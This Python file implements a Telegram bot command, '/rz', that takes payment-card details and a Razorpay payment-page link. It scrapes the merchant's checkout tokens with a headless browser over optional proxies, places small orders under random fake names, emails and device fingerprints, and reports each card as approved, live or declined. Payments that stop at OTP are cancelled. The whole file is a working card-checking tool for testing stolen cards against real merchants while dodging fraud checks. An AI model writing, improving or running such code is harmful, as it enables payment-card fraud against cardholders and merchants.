# commands/rz.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import requests
import json
import random
import re
import os
import platform
import string
from urllib.parse import urlparse, parse_qs
from playwright.sync_api import sync_playwright

router = Router()

# ---------- Helper to run blocking Playwright in thread ----------
async def run_sync(func, *args, **kwargs):
    return await asyncio.to_thread(func, *args, **kwargs)

# ---------- Configuration ----------
DEVICE_FINGERPRINT = ''.join(random.choices(string.ascii_letters + string.digits, k=128))

def setup_proxy(proxy_string):
    if not proxy_string or proxy_string.strip() == "":
        return None
    try:
        parts = proxy_string.strip().split(':')
        if len(parts) == 4:
            ip, port, user, pw = [p.strip() for p in parts]
            return {"server": f"http://{ip}:{port}", "username": user, "password": pw}
        return None
    except:
        return None

def get_dynamic_session_token(proxy_config=None):
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
            browser.close()
            return token
    except Exception as e:
        return None

def extract_merchant_data(site_url, proxy_config=None):
    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
    merchant_handle = merchant_match.group(1) if merchant_match else None
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            intercepted = {}
            def on_resp(r):
                if "api.razorpay.com/v1/payment_links/merchant" in r.url:
                    try:
                        intercepted['data'] = r.json()
                    except:
                        pass
            page.on("response", on_resp)
            page.goto(site_url, timeout=45000, wait_until='networkidle')
            page.wait_for_timeout(3000)
            eval_data = page.evaluate("""() => {
                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__ || window.razorpayData;
                if (d && d.keyless_header) return d;
                for (let k in window) {
                    try {
                        if (window[k] && typeof window[k] === 'object' && window[k].keyless_header) return window[k];
                    } catch(e) {}
                }
                const scripts = document.querySelectorAll('script');
                for (let s of scripts) {
                    const txt = s.textContent || s.innerText;
                    if (txt.includes('keyless_header') || txt.includes('payment_link')) {
                        const matches = txt.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
                        if (matches) {
                            for (let match of matches) {
                                try {
                                    const parsed = JSON.parse(match);
                                    if (parsed.keyless_header || parsed.key_id) return parsed;
                                } catch (e) {}
                            }
                        }
                    }
                }
                return null;
            }""")
            browser.close()
            final = eval_data or intercepted.get('data')
            if final:
                kh = final.get('keyless_header')
                kid = final.get('key_id')
                pl = final.get('payment_link') or final
                if isinstance(pl, str):
                    try:
                        pl = json.loads(pl)
                    except:
                        pass
                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')
                if kh and kid and plid and ppi:
                    return kh, kid, plid, ppi
            if merchant_handle:
                try:
                    api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
                    response = requests.get(api_url, timeout=10)
                    if response.status_code == 200:
                        api_data = response.json()
                        kh = api_data.get('keyless_header')
                        kid = api_data.get('key_id')
                        plid = api_data.get('id')
                        ppi = api_data.get('payment_page_items', [{}])[0].get('id')
                        if kh and kid and plid and ppi:
                            return kh, kid, plid, ppi
                except:
                    pass
            return None, None, None, None
    except Exception:
        return None, None, None, None

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    payload = {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]}
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)
        resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except:
        return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
    headers = {"x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
    data = {
        "notes[comment]": "", "payment_link_id": payment_link_id, "key_id": key_id,
        "contact": f"+91{user_info['phone']}", "email": user_info["email"], "currency": "INR",
        "_[library]": "checkoutjs", "_[platform]": "browser", "_[referer]": site_url,
        "amount": amount_paise, "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT,
        "method": "card", "card[number]": card_number, "card[cvv]": cvv,
        "card[name]": user_info["name"], "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year, "save": "0"
    }
    import urllib.parse
    return session.post(url, headers=headers, params=params, data=urllib.parse.urlencode(data), timeout=20)

def check_payment_status(payment_id, key_id, session_token, keyless_header):
    headers = {'Accept': '*/*', 'User-Agent': 'Mozilla/5.0', 'x-session-token': session_token}
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}', params=params, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get('status', 'unknown'), data
        return 'unknown', {}
    except:
        return 'unknown', {}

def cancel_payment(payment_id, key_id, session_token, keyless_header):
    headers = {'Accept': '*/*', 'User-Agent': 'Mozilla/5.0', 'x-session-token': session_token}
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel', params=params, headers=headers, timeout=15)
        return r.json()
    except:
        return {"error": {"description": "Cancel failed"}}

def process_card_sync(card_str, site_url, amount_rupees=1, proxy_string=None):
    proxy_config = setup_proxy(proxy_string) if proxy_string else None
    # Extract merchant data
    kh, kid, plid, ppi = extract_merchant_data(site_url, proxy_config)
    if not kh:
        return "❌ Failed to extract merchant data"
    stoken = get_dynamic_session_token(proxy_config)
    if not stoken:
        return "❌ Failed to get session token"
    amount_paise = amount_rupees * 100
    # Parse card
    parts = card_str.split('|')
    if len(parts) != 4:
        return "❌ Invalid card format. Use CC|MM|YY|CVV"
    cc, mm, yy, cvv = [p.strip() for p in parts]
    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)
    # Create order
    session = requests.Session()
    order_id = create_order(session, plid, amount_paise, ppi)
    if not order_id:
        return "❌ Order creation failed"
    import time, random
    time.sleep(random.uniform(1, 2))
    # User info
    user_info = {
        "name": "Test User",
        "email": f"testuser{random.randint(100,999)}@gmail.com",
        "phone": f"9876543{random.randint(100,999)}"
    }
    # Submit payment
    resp = submit_payment(session, order_id, (cc, mm, yy, cvv), user_info, amount_paise, kid, kh, plid, stoken, site_url)
    try:
        pdata = resp.json()
    except:
        return "❌ Payment submission failed"
    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
        if pid:
            time.sleep(3)
            stat, _ = check_payment_status(pid, kid, stoken, kh)
            if stat in ['captured', 'authorized']:
                return f"✅ APPROVED | ID: {pid} | Status: {stat}"
            if stat == 'failed':
                return f"❌ DECLINED | ID: {pid} | Payment failed"
            if stat == 'created':
                return f"⚠️ LIVE (3DS) | ID: {pid} | Card is live, needs OTP"
            cdata = cancel_payment(pid, kid, stoken, kh)
            if cdata.get('error', {}).get('reason') == 'payment_cancelled':
                return f"⚠️ LIVE (3DS) | ID: {pid} | Card is live"
            return f"❌ DECLINED | ID: {pid} | {cdata.get('error',{}).get('description','Declined')}"
        return "❌ No payment ID in redirect"
    if "error" in pdata:
        err = pdata.get('error', {})
        desc = err.get('description', 'Unknown error').replace("%s", "Card")
        return f"❌ DECLINED | {desc}"
    return f"⚠️ UNKNOWN | {json.dumps(pdata)[:100]}"

async def run_rz(card_str, site_url, amount=1, proxy=None):
    return await asyncio.to_thread(process_card_sync, card_str, site_url, amount, proxy)

@router.message(Command("rz"))
async def cmd_rz(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer(
            "❌ **Usage:** `/rz CC|MM|YY|CVV <site_url> [amount_rupees] [proxy]`\n"
            "Example: `/rz 4111111111111111|12|28|123 https://razorpay.me/@store`\n"
            "Amount defaults to 1 INR. Proxy format: `ip:port:user:pass`"
        )
        return
    parts = args[1].split()
    if len(parts) < 2:
        await message.answer("❌ Provide card and site URL.")
        return
    card_str = parts[0]
    site_url = parts[1]
    amount = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 1
    proxy = parts[3] if len(parts) > 3 else None
    progress = await message.answer(f"⏳ Checking card on Razorpay... (₹{amount})")
    try:
        result = await run_rz(card_str, site_url, amount, proxy)
        await progress.edit_text(f"💳 Card: `{card_str}`\n🌐 Site: {site_url}\n📦 Result: {result}\n\nBy @hqdeven")
    except Exception as e:
        await progress.edit_text(f"❌ Error: {str(e)}")
